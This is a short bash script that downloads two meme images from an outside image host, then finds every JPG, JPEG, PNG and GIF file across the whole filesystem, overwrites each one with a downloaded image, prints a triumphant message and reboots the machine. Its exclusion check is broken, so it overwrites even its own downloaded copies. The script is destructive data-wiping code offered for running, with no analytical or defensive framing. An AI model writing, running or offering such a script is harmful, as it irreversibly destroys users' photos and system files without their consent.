#!/bin/bash

# Download the images and save them
wget -qO image.jpg "https://i.postimg.cc/nLwf48bX/styerteletubby.png"
wget -qO image1.jpg "https://i.postimg.cc/cLWBYgkv/gameoverzhang.png"

# Replace all images on the system with either image.jpg or image1.jpg
excluded_images=("$(pwd)/image.jpg" "$(pwd)/image1.jpg")


# Find all image files on the system
image_files=$(find / -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" \))

# Loop through all image files and replace them with a random choice from replacement_images
for image_file in $image_files
do
	if [[ "$image_file" != *"#excluded_images"* ]]; then 
    		replacement_image=${excluded_images[$RANDOM % ${#excluded_images[@]}]}
    		cp "$replacement_image" "$image_file"
    
    	fi
done

echo "IT IS FINISHED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
reboot
